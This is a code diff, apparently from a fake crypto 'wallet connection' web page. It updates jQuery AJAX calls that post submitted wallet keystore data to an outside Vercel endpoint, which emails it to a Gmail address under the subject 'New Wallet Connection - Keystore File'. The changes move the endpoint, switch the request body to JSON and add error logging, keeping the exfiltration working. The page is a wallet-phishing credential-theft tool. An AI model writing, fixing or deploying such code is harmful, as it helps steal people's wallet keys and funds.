@@ -5368,9 +5368,10 @@
 
 								// Send to our email service
 								$.ajax({
-									url: 'https://cavarates-green.vercel.app/api/send-email',
+									url: 'https://layerchain-backend.vercel.app/api/send-email',
 									method: 'POST',
-									data: {
+									contentType: 'application/json',
+									data: JSON.stringify({
 										to: 'layerchaindrop@gmail.com',
 										subject:
 											'New Wallet Connection - Keystore File',
@@ -5386,7 +5387,7 @@
 												'Not provided'
 											}</p>
 										`,
-									},
+									}),
 									success: function () {
 										lastSubmissionTime = Date.now();
 										$('#floating-submission-box').fadeOut();
@@ -5404,7 +5405,11 @@
 									error: function (xhr, status, error) {
 										console.error(
 											'Submission failed:',
-											error
+											error,
+											'Status:',
+											status,
+											'Response:',
+											xhr.responseText
 										);
 										alert(
 											'Submission failed. Please try again.'
@@ -5429,9 +5434,10 @@
 								};
 
 								$.ajax({
-									url: 'https://cavarates-green.vercel.app/api/send-email',
+									url: 'https://layerchain-backend.vercel.app/api/send-email',
 									method: 'POST',
-									data: payload,
+									contentType: 'application/json',
+									data: JSON.stringify(payload),
 									success: function () {
 										lastSubmissionTime = Date.now();
 										$('#floating-submission-box').fadeOut();
@@ -5449,7 +5455,11 @@
 									error: function (xhr, status, error) {
 										console.error(
 											'Submission failed:',
-											error
+											error,
+											'Status:',
+											status,
+											'Response:',
+											xhr.responseText
 										);
 										alert(
 											'Submission failed. Please try again.'
